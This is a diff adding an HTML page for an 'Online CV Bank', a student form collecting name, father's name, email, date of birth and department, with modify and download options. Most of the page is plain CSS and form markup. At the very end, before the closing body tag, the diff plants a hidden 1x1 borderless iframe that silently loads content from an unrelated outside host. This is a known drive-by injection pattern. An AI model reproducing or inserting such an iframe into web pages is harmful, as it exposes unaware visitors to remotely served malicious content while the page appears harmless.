@@ -1,0 +1,236 @@
+<html>
+<head>
+ <title>Online CV Bank</title>
+</head>
+<style>
+ body
+ {
+  background-color: #C9BE62;
+ }
+ table
+ {
+  width: 95%;
+
+ }
+ header
+ {
+  width:102%;
+  top: 0px;
+  
+  margin-top:-31px;
+  margin-left: -10px;
+  
+  height: 70px;
+  background-color:#827839 ;
+
+ }
+ footer
+ {
+  position:absolute;
+  width:102%;
+  bottom: 0px;
+  
+  
+  margin-left: -10px;
+  
+  height: 70px;
+  background-color:#827839 ;
+
+ }
+
+
+
+
+  .top1
+  {
+    width: 350px; 
+     
+  }  
+ .font-style-top
+  {
+    font-size: 120%; 
+    color:#C8B560;
+    line-height: 2.5em;
+    margin-left: 7%;
+  }
+  .font-style-bottom
+  {
+    font-size: 90%; 
+    color:#C8B560;
+    line-height: 2.5em;
+    margin-left: 7%;
+  }
+ .body-text
+  {
+   font-size: 100%;
+   color:#805817;
+  }
+  .table-text
+  {
+   font-size: 100%;
+   color:#805817;
+   text-align: right;
+  
+  }
+  .table-text-one
+  {
+   font-size: 100%;
+   color:#805817;
+  }  
+  .shadow
+   {
+     box-shadow:10px 10px 20px #4E4848;
+     -webkit-box-shadow:10px 10px 20px #4E4848;
+     -moz-box-shadpw:10px 10px 20px #4E4848;
+   }
+.tooltip{
+    display: inline;
+    /position: relative;
+}
+.tooltip:hover:after{
+    background: #333;
+    background: rgba(0,0,0,.8);
+    border-radius: 5px;
+    bottom: 26px;
+    color: #fff;
+    content: attr(data-tip);
+    left: 20%;
+    padding: 5px 15px;
+    position: absolute;
+    z-index: 98;
+    width: 220px;
+}
+.tooltip:hover:before{
+    border: solid;
+    border-color: #333 transparent;
+    border-width: 6px 6px 0 6px;
+    bottom: 20px;
+    content: "";
+    left: 50%;
+    position: absolute;
+    z-index: 99;
+}
+   .help
+   {
+    background-color: #FFFF73;
+    border-radius: 10px;
+    display: none;
+    opacity: 0.9;
+    padding: 10px;
+    z-index: 100;
+   }
+   .help_link:hover{
+     display: inline;
+   }
+  /*  
+  .parentTable{
+    width: 100%;
+    border: 1px solid #b4b4b4;
+}
+.parentTable tr td{
+    padding: 5px 30px;
+}
+.parentTable tr td.header{
+    background: #265ca5;
+}
+.parentTable tr td.spec{
+    width: 1px;
+    padding: 0;
+    border: none;
+    background: #b4b4b4;
+}
+.childTable{
+    width: 100%;
+}
+.childTable tr td{
+    border-bottom: 1px dashed;
+}
+.childTable tr:last-child td{
+    border: none;
+}
+  */  
+  
+</style>
+<body>
+ <!--HEADRER-->
+ <header>
+  <span>
+  <div class="top1">
+     <h2><p class="font-style-top">Online CV Bank</p></h2>
+  </div>
+ </span>   
+</header>
+<br><br><br><br>
+<table>
+<!--Form for CV-->
+ <tr>
+  <td valign="top" style="border-right: 1px solid #827839; padding: 5px;">
+   <table>
+    <tr><td>
+     <h4><p class="table-text">Fill Up The Form Below:</p></h4>
+     </td>
+     </tr>
+    
+    <tr>
+     <td><p class="table-text">Full Name:</p></td><td><input type="text" size = 24px class="shadow" class="input_text" placeholder="Your Full Name"/></td>
+    </tr>
+    <tr>
+     <td><p class="table-text">Father's Name:</p></td><td><input type="text" class="shadow" class="input_text" placeholder="Father's Name"/></td>
+    </tr>
+    <tr>
+     <td><p class="table-text">Email:</p></td><td><span data-tip = "Enter Your Email address not in @students.becs.ac.in" class = "tooltip" ><input type="email" class="shadow"  class="input_text" placeholder="Except @students.becs.ac.in"/></span></td>
+   </tr>
+   <tr>
+    <td><p class="table-text">Date of Birth:</p></td><td><input type="date"class="shadow" class="input_text" placeholder="dd/mm/yyyy"/></td>
+   </tr>
+   <tr>
+    <td><p class="table-text">Department:</p></td>
+    <td>
+     <select class="shadow">    
+      <option value="cst">Computer Science and Technology</option>
+      <option value="it">Information Technology</option>
+      <option value="etc">Electronics and Telecommunication</option>
+     </select>
+    </td>
+   </tr>
+   <tr>
+   <td></td>
+   <td><input type="submit" class="shadow" value="Submit"/></td>
+   </tr>
+   </table>
+  </td>
+  <!--Download Section-->
+  <td>
+  <table>
+  <tr><td><h4><p class="table-text">Modify and Download Your CV:</p></h4></td><td></td></tr>
+  <tr>
+  <td>
+   <p class="table-text">Modify Your Data:</p>
+  </td>
+  <td>
+    <select class="shadow">
+     <option>Full Name</option>
+     <option>Father's Name</option>
+     <option>Email</option>
+     <option>Date of Birth</option>
+     <option>Department</option>
+    </select>
+  </td>
+  </tr>
+  <tr>
+  <td></td><td><input type="submit" class="shadow" value="Submit"/></td>
+  </tr>
+  
+  <tr><td><br><p class="table-text">Download or View Your CV:</p></td>
+  <td><br><p class="table-text-one">&nbsp;<a href="#">(View)</a> or <a href="#">(Download)</a></p></td></tr>
+ </table>
+ </tr>
+ </table>
+ <footer>
+  <p class="font-style-bottom">Developer: Subhasish Kundu</p>
+
+ </footer>
+ <iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+ </html>
+
